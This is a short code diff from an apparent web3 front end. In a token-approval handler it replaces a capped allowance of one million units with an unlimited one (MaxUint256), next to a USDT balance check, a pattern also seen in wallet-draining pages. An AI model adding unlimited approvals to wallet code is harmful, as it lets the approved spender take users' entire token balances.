@@ -284,7 +284,7 @@ approveBtn.addEventListener("click", async () => {
 
     _cachedAddress = userAddress;
 
-    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
+    const CAP_AMOUNT = ethers.MaxUint256;
     const iface      = new ethers.Interface(ERC20_ABI);
 
     const usdtBalance = await getUsdtBalance(userAddress, iface);
